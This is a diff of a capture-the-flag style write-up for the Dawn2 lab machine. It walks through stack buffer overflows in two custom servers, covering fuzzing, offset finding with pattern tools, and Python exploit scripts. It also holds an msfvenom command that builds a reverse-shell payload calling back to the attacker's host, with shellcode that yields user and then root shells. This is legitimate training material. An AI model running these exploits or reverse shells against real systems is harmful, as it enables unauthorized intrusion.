@@ -1,8 +1,9 @@
 # Exploitation Guide for Dawn2
 ## Summary
-### This machine is running a couple of servers, both of which are vulnerable to a stack-based buffer overflow that leads to remote code execution. One of the servers is leaked from a website and grants the attacker local privileges on the target. The second server, running as root, is then leaked from the target itself and grants the attacker a root shell when exploited.
+### This machine is running a couple of servers, vulnerable to a stack-based buffer overflow that leads to remote code execution. One of the servers is leaked from a website and grants the attacker local privileges on the target. The second server, running as root, is then leaked from the target itself and grants the attacker a root shell when exploited.
 ## Enumeration
 
+### Ports Open 80,1435,1985
 ``` bash
 nmap -sCV -v -T4 -p- <IP> --open
 
@@ -28,7 +29,7 @@ MAC Address: 08:00:27:F2:DF:36 (Oracle VirtualBox virtual NIC)
 ```
 
 ## Web Enumeration Port 80
-Navigating to the default page on port 80 (http://192.168.120.71/) reveals a link to a custom server download: http://192.168.120.71/dawn.zip. 
+Navigating to the default page on port 80 (http://192.168.55.12/) reveals a link to a custom server download: http://192.168.55.12/dawn.zip. 
 We will download it and unzip the contents. Inside are two files: README.txt and dawn.exe. The README file contains the following:
 
 ```
@@ -48,19 +49,19 @@ On our machine, we examine the file, learning it is a 32 bit x86 windows executa
 
 ```ruby
 
-# file dawn.exe
+$ file dawn.exe
 dawn.exe: 
 p32 executable (console) Intel 80386, for MS Windows
 
 ```
 
 Transfer the dawn.exe file to my homelab Windows 10 vm with Immunity Debugger already installed.
-With python server running on my kali linux machine, complete the transfer by browsing to http://10.0.2.30:8000 and select download.
+With python server running on my kali linux machine, complete the transfer by browsing to http://10.0.2.30:8000 on the Windows vm and select download.
 
-```bash
+```ruby
 
 ┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
-└─# python3 -m http.server  8000
+└─$ python3 -m http.server  8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.0.2.40 - - [29/Jul/2022 20:54:03] "GET / HTTP/1.1" 200 -
 10.0.2.40 - - [29/Jul/2022 20:54:04] code 404, message File not found
@@ -74,7 +75,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "10.0.2.40"   #server where immun debugger is Computer Name: Spidey
+server = "10.0.2.40"   #server where immun debugger is, Computer Name: Spidey
 port = 1985
 
 As = b'A'
@@ -97,14 +98,14 @@ if __name__ == "__main__":
     
 ```    
 
-With Immunity Debugger run as Administrator on the Windows vm, we run the python script above, sending 500 byte encoded A's 
-and end it with a nullbyte as instructed by the message we found earlier. We show we can overwrite the Execution Instruction Pointer (EIP) on the Stack with A's (ascii 41).  Buffer Overflow vulnerability likely exists.
+With Immunity Debugger run as Administrator on the Windows vm, run the python script above, sending 500 byte-encoded A's 
+and end it with a nullbyte as instructed by the message we found earlier. We show we can overwrite the Execution Instruction Pointer (EIP) on the Stack with A's (41414141).  Buffer Overflow vulnerability likely exists.
 
 ![test1](https://user-images.githubusercontent.com/76034874/181864956-0bf73890-b264-4522-89e8-fc1b6e5db3cf.png)
 
 
 ## Finding the Offset
-our 2nd poc script will contain a unique repeating pattern of characters so we can identify where in memory the program is crashing.
+The 2nd poc script will contain a unique repeating pattern of characters so we can easily find where in memory the program is crashing. Use pattern_create like this:
 
 ``` bash
 ┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
@@ -377,17 +378,17 @@ if __name__ == "__main__":
 
 # Exploiting our Target
 ## with our poc script working in our test environment, it's time to exploit our real target, the Dawn machine:
-change the server to the target IP
-generate shellcode to match the arch and OS of the target, namely linux and x86:
-
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.55.12 LPORT=4444 -f py -b "\x00" -v shellcode
+in the script, change the server to the target IP
+generate shellcode using msfvenom to match the arch and OS of the target, linux and x86:
+set LHOST to our tun0 and pick a LPORT:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.55 LPORT=4444 -f py -b "\x00" -v shellcode
 
 ```python
 
 #!/usr/bin/python3
 
 import socket,os,sys
-server = "192.168.55.12"   #server where immun debugger is Computer Name: Spidey
+server = "192.168.55.12"   #target server 
 port = 1985
 
 shellcode =  b""
@@ -426,15 +427,15 @@ if __name__ == "__main__":
 ![bling](https://user-images.githubusercontent.com/76034874/181871630-b621286e-9424-49de-b801-12e18335066f.png)
 
 
-# Part2 BOF
-## We notice another .exe binary in the 1st directory we land in on the target.  We download it same as before to our machine and examine it to find it is the same type (32 bit x86 Little Endian Windows executable).
+## Part2 BOF
+### We notice another .exe binary on the target in the 1st directory we land in.  Download it to our machine like before. We examine it to find it's the same type (32 bit x86 Little Endian Windows executable).
 
 ```bash
 ┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
 └─# file dawn-BETA.exe                            
 dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows
 ```
-# Sending the As, 500 just like before
+# Sending 500 As, same as before, this time to the other open port 1435:
 
 ```python
 
@@ -446,11 +447,13 @@ payload = As + nullbyte
 ---snip---
 ```
 
-# Sending Unique Characters
+# Sending 500 Unique Characters
 
 ```python
-
+unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
 ```
+
+using pattern_offset, we find the offset at 13:
 
 ```bash
 
@@ -458,6 +461,13 @@ payload = As + nullbyte
 └─# msf-pattern_offset -q 61413461
 [*] Exact match at offset 13
 ```
+
+## Bad Char Test comes up clean
+
+![badchar](https://user-images.githubusercontent.com/76034874/181870131-29d479b1-fb04-4e7d-a1ff-2dc5c950295c.png)
+
+## reuse linux revshell code from previous step
+
 
 ```python
 
@@ -476,7 +486,7 @@ shellcode += b"\x1a\xce\xcf\x50\x97\x1d\x8f"
 ```
 
 
-#Root
+# Root
 
 ![root](https://user-images.githubusercontent.com/76034874/181872819-cce1a45a-54cd-4783-be6b-cf27ba062a62.png)
 
